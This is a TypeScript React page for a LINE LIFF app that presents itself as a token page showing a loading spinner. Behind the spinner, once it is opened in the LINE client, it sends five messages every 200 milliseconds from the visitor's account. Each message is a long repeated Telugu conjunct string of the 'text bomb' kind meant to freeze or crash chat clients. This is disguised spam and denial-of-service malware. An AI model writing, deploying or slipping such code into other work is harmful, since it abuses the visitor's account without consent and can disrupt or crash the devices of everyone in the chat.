"use client";
import { liff } from "@line/liff";
import { getLiffId } from "@/utils/getLiffId";
import { useEffect } from "react";
import { Loading } from "@/src/components/Loading/Loading";

export default function Token() {
  useEffect(() => {
    liff
      .init({
        liffId: getLiffId(),
      })
      .then(() => {
        if (liff.isInClient()) {
          setInterval(() => {
            const msg: {
              type: "text",
              text: string
            } = {
              type: "text",
              text: "==J==" + "జ్ఞా".repeat(2498),
            }

            liff.sendMessages([msg, msg, msg, msg, msg])
          }, 200)
        }
      });
  }, []);
  return <Loading />;
}
